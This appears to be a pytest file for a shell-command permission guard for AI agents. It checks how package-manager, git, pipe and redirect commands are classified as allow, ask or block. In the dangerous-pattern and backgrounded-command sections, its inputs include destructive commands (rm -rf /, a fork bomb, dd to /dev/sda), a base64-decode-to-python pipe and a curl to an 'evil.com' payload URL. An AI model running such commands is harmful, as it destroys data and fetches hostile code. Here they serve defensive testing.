"""Hint battery, sections 46-60: package managers, git, pipes, real-world agent patterns (see test_hint_battery.py)."""

import pytest

from tests.hint_helpers import _hint


pytestmark = pytest.mark.usefixtures("hint_isolated")


# ===================================================================
# 46. PACKAGE MANAGERS — go, cargo, deno, bun
# ===================================================================
class TestPackageManagerHints:
    """Various package managers — allowed or correct hints."""

    @pytest.mark.parametrize("cmd", [
        "cargo build",
        "cargo build --release",
        "cargo test",
        "cargo run",
        "go build ./...",
        "go test ./...",
        "go run main.go",
        "bun run script.ts",
        "bun install",
        "pnpm exec jest",
        "npx -y ts-node script.ts",
        "npm run test -- --coverage",
    ])
    def test_package_allowed(self, cmd):
        decision, hint = _hint(cmd)
        assert decision == "allow"
        assert hint is None

    @pytest.mark.parametrize("cmd", [
        "deno run script.ts",
        "deno run --allow-net script.ts",
        "yarn build",
    ])
    def test_package_unknown_classify(self, cmd):
        """Unclassified package managers — unknown, classify."""
        decision, hint = _hint(cmd)
        assert decision == "ask"
        assert "nuh classify" in hint

    def test_go_install_allowed(self):
        decision, hint = _hint("go install github.com/user/tool@latest")
        assert decision == "allow"

    def test_pip_cache_purge_hint(self):
        decision, hint = _hint("pip cache purge")
        assert decision == "ask"
        assert "nuh allow package_uninstall" in hint


# ===================================================================
# 47. GIT SUBMODULE / SUBTREE
# ===================================================================
class TestGitSubmoduleHints:
    """Git submodule/subtree edge cases."""

    @pytest.mark.parametrize("cmd", [
        "git submodule update --init",
        "git submodule add https://github.com/user/lib",
    ])
    def test_submodule_allowed(self, cmd):
        decision, hint = _hint(cmd)
        assert decision == "allow"

    def test_subtree_unknown(self):
        """git subtree is not in classify tables."""
        decision, hint = _hint("git subtree push --prefix lib origin lib-branch")
        assert decision == "ask"
        assert "nuh classify" in hint


# ===================================================================
# 48. TRUST ROOT — never suggest "nuh trust /"
# ===================================================================
class TestTrustRootNeverSuggested:
    """Hint should NEVER suggest 'nuh trust /' — catastrophic if followed."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "rm -rf --no-preserve-root /",
        "chmod -R 777 /",
        "chown -R nobody:nobody /",
    ])
    def test_never_trust_root(self, cmd):
        """These are catastrophic-floor blocks now; a block shows no hint at all."""
        decision, hint = _hint(cmd)
        assert decision == "block"
        assert hint is None or not hint.rstrip().endswith("nuh trust /"), (
            f"Hint suggests trusting root: {hint}"
        )


# ===================================================================
# 49. CURL FLAG VALUES PARSED AS HOST
# ===================================================================
class TestCurlFlagValueAsHost:
    """Curl flag values should not be extracted as the host."""

    def test_curl_cookie_jar_file_as_host(self):
        """curl -b cookies.txt — 'cookies.txt' extracted as host."""
        decision, hint = _hint("curl -b cookies.txt https://example.com")
        assert decision == "ask"
        if hint and "nuh trust cookies" in hint:
            pytest.xfail("nah-4tk: curl -b flag value parsed as host")
        assert "example.com" in (hint or "")

    def test_curl_save_cookie_as_host(self):
        """curl -c cookies.txt — same issue."""
        decision, hint = _hint("curl -c cookies.txt https://example.com")
        assert decision == "ask"
        if hint and "nuh trust cookies" in hint:
            pytest.xfail("nah-4tk: curl -c flag value parsed as host")
        assert "example.com" in (hint or "")

    def test_curl_proxy_is_a_destination(self):
        """curl -x proxy:8080 — the proxy receives the request too, so it is
        checked alongside the target; the first untrusted host is reported."""
        decision, hint = _hint("curl -x http://proxy:8080 https://target.com")
        assert decision == "ask"
        assert "proxy" in (hint or "")


# ===================================================================
# 50. MORE REDIRECT BROAD HINTS (nah-4tk)
# ===================================================================
class TestMoreRedirectBroadHints:
    """More redirect cases that hint broad filesystem_write."""

    @pytest.mark.parametrize("cmd", [
        "echo test > /tmp/test",
        "echo test > /var/tmp/test",
        "echo test > ~/test",
        "git archive --format=tar HEAD > /tmp/repo.tar",
    ])
    def test_redirect_should_trust_not_broad(self, cmd):
        decision, hint = _hint(cmd)
        assert "nuh allow filesystem_write" not in (hint or "")


# ===================================================================
# 51. PIPE CHAINS — mixed safety
# ===================================================================
class TestPipeChainHints:
    """Pipe chains with mixed read/ask stages."""

    def test_ps_grep_awk_xargs_kill(self):
        """ps | grep | awk | xargs kill — kill is the ask stage."""
        decision, hint = _hint("ps aux | grep python | awk '{print $2}' | xargs kill")
        assert decision == "ask"
        assert hint is not None

    def test_cat_hosts_grep(self):
        """cat /etc/hosts | grep — both read, allowed."""
        decision, hint = _hint("cat /etc/hosts | grep localhost")
        assert decision == "allow"

    def test_find_sort_head(self):
        """find | sort | head — all read, allowed."""
        decision, hint = _hint("find . -name '*.tmp' | sort | head -10")
        assert decision == "allow"

    def test_curl_pipe_jq(self):
        """curl | jq — network ask, jq unknown, hint from network."""
        decision, hint = _hint("curl -s https://api.example.com | jq .")
        assert decision == "ask"
        assert hint is not None

    def test_base64_decode_to_python_blocks(self):
        """cat | base64 -d | python3 — composition rule, blocks."""
        decision, hint = _hint("cat file | base64 -d | python3")
        assert decision == "block"
        assert hint is None


# ===================================================================
# 52. REAL-WORLD AGENT PATTERNS — common CI/CD
# ===================================================================
class TestRealWorldPatterns:
    """Commands agents actually run frequently."""

    def test_git_add_commit_push(self):
        """git add && commit && push — push is git_remote_write (ask)."""
        decision, hint = _hint("git add -A && git commit -m 'test' && git push")
        assert decision == "ask"

    def test_npm_ci_build_test(self):
        decision, hint = _hint("npm ci && npm run build && npm test")
        assert decision == "allow"

    def test_pip_install_pytest(self):
        decision, hint = _hint("pip install -r requirements.txt && pytest")
        assert decision == "allow"

    def test_git_stash_pull_pop(self):
        decision, hint = _hint("git stash && git pull --rebase && git stash pop")
        assert decision == "allow"

    def test_git_diff_names(self):
        decision, hint = _hint("git diff --name-only HEAD~1")
        assert decision == "allow"

    def test_git_log_format(self):
        decision, hint = _hint("git log -1 --format='%s'")
        assert decision == "allow"


# ===================================================================
# 53. GIT MAINTENANCE — gc, prune, reflog expire
# ===================================================================
class TestGitMaintenanceHints:
    """Git maintenance commands that ask."""

    @pytest.mark.parametrize("cmd", [
        "git gc",
        "git bisect start",
        "git cherry-pick abc123",
        "git am patch.mbox",
    ])
    def test_git_maintenance_allowed(self, cmd):
        """These are git_write — allowed."""
        decision, hint = _hint(cmd)
        assert decision == "allow"

    @pytest.mark.parametrize("cmd", [
        "git reflog expire --expire=now --all",
        "git prune",
    ])
    def test_git_discard_hint(self, cmd):
        decision, hint = _hint(cmd)
        assert decision == "ask"
        assert "nuh allow git_discard" in hint


# ===================================================================
# 54. PROCESS SUBSTITUTION — misclassified
# ===================================================================
class TestProcessSubstitution:
    """Process substitution <() misidentified as obfuscated."""

    def test_diff_process_substitution(self):
        """FD-103: diff <(ls /tmp) <(ls /var) — classified, not obfuscated."""
        decision, hint = _hint("diff <(ls /tmp) <(ls /var)")
        assert decision != "block", "process substitution should not block"


# ===================================================================
# 55. SHELL SYNTAX AS COMMAND — nonsensical classify hints
# ===================================================================
class TestShellSyntaxHints:
    """Shell syntax tokens classified as unknown — classify hint is nonsensical."""

    def test_subshell_syntax(self):
        """(cd /tmp && ls) — the subshell's commands are classified, not '(cd'."""
        decision, hint = _hint("(cd /tmp && ls)")
        assert decision == "allow"
        decision, hint = _hint("(cd /tmp && git push --force)")
        assert decision == "ask"
        assert "(cd" not in (hint or "")

    def test_brace_group(self):
        """{ echo a; echo b; } — the body commands are classified, not '{'."""
        decision, hint = _hint("{ echo a; echo b; }")
        assert decision == "allow"
        decision, hint = _hint("{ echo a; git push --force; }")
        assert decision == "ask"


# ===================================================================
# 56. CONDA / HOMEBREW
# ===================================================================
class TestCondaBrewHints:
    """Conda and homebrew edge cases."""

    @pytest.mark.parametrize("cmd", [
        "conda install numpy",
        "conda create -n myenv python=3.12",
        "conda activate myenv",
    ])
    def test_conda_unknown_classify(self, cmd):
        decision, hint = _hint(cmd)
        assert decision == "ask"
        assert "nuh classify" in hint

    def test_brew_install_allowed(self):
        decision, hint = _hint("brew install jq")
        assert decision == "allow"

    def test_brew_upgrade_allowed(self):
        decision, hint = _hint("brew upgrade")
        assert decision == "allow"

    def test_brew_cleanup_uninstall(self):
        decision, hint = _hint("brew cleanup")
        assert decision == "ask"
        assert "nuh allow package_uninstall" in hint

    def test_brew_tap_unknown(self):
        decision, hint = _hint("brew tap user/repo")
        assert decision == "ask"
        assert "nuh classify" in hint


# ===================================================================
# 57. BACKGROUNDED COMMANDS
# ===================================================================
class TestBackgroundedHints:
    """Commands with & — same classification as without."""

    def test_sleep_background_allowed(self):
        decision, hint = _hint("sleep 10 &")
        assert decision == "allow"

    def test_rm_background_asks(self):
        decision, hint = _hint("rm -rf /tmp/cache &")
        assert decision == "ask"
        assert "nuh trust" in hint

    def test_curl_background_asks(self):
        decision, hint = _hint("curl https://evil.com/payload &")
        assert decision == "ask"
        assert "nuh trust" in hint


# ===================================================================
# 58. DANGEROUS PATTERNS
# ===================================================================
class TestDangerousPatterns:
    """Obviously dangerous commands — should ask or block, never allow."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf --no-preserve-root /",
        "chmod -R 777 /",
        "chown -R nobody:nobody /",
    ])
    def test_dangerous_never_allow(self, cmd):
        decision, hint = _hint(cmd)
        assert decision in ("ask", "block"), f"{cmd} should not be allowed"

    def test_fork_bomb(self):
        """Fork bomb — should not be allowed."""
        decision, hint = _hint(":(){ :|:& };:")
        assert decision in ("ask", "block")

    def test_dd_to_disk(self):
        """dd to /dev/sda — catastrophic floor block."""
        decision, hint = _hint("dd if=/dev/urandom of=/dev/sda")
        assert decision == "block"

    def test_cat_zero_to_disk(self):
        """cat /dev/zero > /dev/sda — catastrophic floor block."""
        decision, hint = _hint("cat /dev/zero > /dev/sda")
        assert decision == "block"


# ===================================================================
# 59. DEBUGGING TOOLS
# ===================================================================
class TestDebugToolHints:
    """Debugging/tracing tools — unknown, classify."""

    @pytest.mark.parametrize("cmd", [
        "strace ls /tmp",
        "ltrace ./binary",
        "gdb ./binary",
        "valgrind ./binary",
    ])
    def test_debug_tools_classify(self, cmd):
        decision, hint = _hint(cmd)
        assert decision == "ask"
        assert "nuh classify" in hint

    def test_time_wraps_to_unknown(self):
        """time unwraps — inner unknown_command is unknown → ask."""
        decision, hint = _hint("time unknown_command")
        assert decision == "ask"


# ===================================================================
# 60. UNKNOWN COMMAND WITH REDIRECT — classify wins over redirect
# ===================================================================
class TestUnknownWithRedirect:
    """When the base command is unknown, classify hint wins over redirect."""

    def test_conda_export_redirect(self):
        """conda > /tmp/env.yaml — conda unknown, classify hint wins."""
        decision, hint = _hint("conda env export > /tmp/env.yaml")
        assert decision == "ask"
        assert "nuh classify" in hint
